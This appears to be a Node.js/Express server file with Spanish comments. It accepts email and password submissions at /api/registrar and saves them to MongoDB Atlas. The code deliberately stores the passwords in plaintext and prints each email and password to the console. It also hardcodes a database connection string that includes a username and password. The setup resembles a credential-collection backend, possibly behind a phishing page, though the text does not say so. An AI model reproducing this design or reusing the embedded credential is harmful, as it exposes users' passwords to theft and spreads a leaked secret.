const express = require('express');
const mongoose = require('mongoose');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware para procesar JSON y formularios
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Servir tu archivo index.html y recursos estáticos
app.use(express.static(__dirname));

// ==========================================
// CONEXIÓN A MONGODB ATLAS (Con tus datos)
// ==========================================
const MONGO_URI = process.env.MONGO_URI || "mongodb+srv://garaygabriel155_db_user:fAqpqIHAxDRr8BRb@cluster0.pjdev7b.mongodb.net/bubu_db?retryWrites=true&w=majority&appName=Cluster0";

mongoose.connect(MONGO_URI)
  .then(() => console.log('[+] Conectado exitosamente a MongoDB Atlas'))
  .catch(err => console.error('[-] Error al conectar a MongoDB:', err));

// Definir el esquema y modelo de los datos (guardando contraseña en texto plano)
const userSchema = new mongoose.Schema({
    email: { type: String, required: true },
    password: { type: String, required: true }, // Texto plano
    fecha: { type: Date, default: Date.now }
});

const User = mongoose.model('User', userSchema);

// ==========================================
// ENDPOINT DE REGISTRO (/api/registrar)
// ==========================================
app.post('/api/registrar', async (req, res) => {
    try {
        const { email, password } = req.body;

        if (!email || !password) {
            return res.status(400).json({ 
                ok: false, 
                mensaje: 'Se requiere el correo electrónico y la contraseña.' 
            });
        }

        // Crear y guardar el usuario directamente en MongoDB
        const nuevoUsuario = new User({ email, password });
        await nuevoUsuario.save();

        console.log(`[+] Nuevo registro guardado en MongoDB -> Email: ${email} | Password: ${password}`);

        return res.status(200).json({ 
            ok: true, 
            mensaje: 'Cuenta creada y guardada en la base de datos.' 
        });

    } catch (error) {
        console.error('Error al registrar usuario:', error);
        return res.status(500).json({ 
            ok: false, 
            mensaje: 'Error interno en el servidor.' 
        });
    }
});

// Iniciar servidor
app.listen(PORT, () => {
    console.log(`Servidor corriendo en http://localhost:${PORT}`);
});